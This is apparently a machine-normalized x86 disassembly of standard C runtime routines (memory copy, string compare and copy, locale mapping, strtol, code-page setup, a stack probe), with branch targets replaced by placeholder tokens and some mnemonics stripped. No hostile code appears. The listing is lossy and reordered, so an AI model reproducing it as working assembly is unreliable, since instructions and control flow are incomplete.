sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4070d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4070d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4070d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4070d0 ]
sub_407130
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4071c0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_4072c0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_407300
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_407340
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_407380
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4073e0 ]
jmp [ ecx * 4 + jump_table_40745c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4074c8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4074c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_407660 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_407568 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407660 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4074c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4074c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4074c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_407660 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407660 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407660 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407660 ]
sub_4076b5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_4078d9
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_407b20
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_407b20
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_4078d9
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40791b
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_4087b0
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_403e9d
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407b20
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_407b60
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_407b91
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_4044cd
push [ ebp + 0x8 ]
call sub_407d3e
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_407dbb
xor edx edx
mov eax rw-data
push 0x19
call sub_40452e
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jb r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_407d88
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_407de4
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_407d88
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_407d3e
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_407d88
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_407dbb
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_407de4
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_405f9d
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_4076b5
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_4076b5
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_407f85
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40800e
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_40802f
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_40800e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_40800e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_40800e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_40800e
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_40808d
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_4080bb
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_4080e8
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
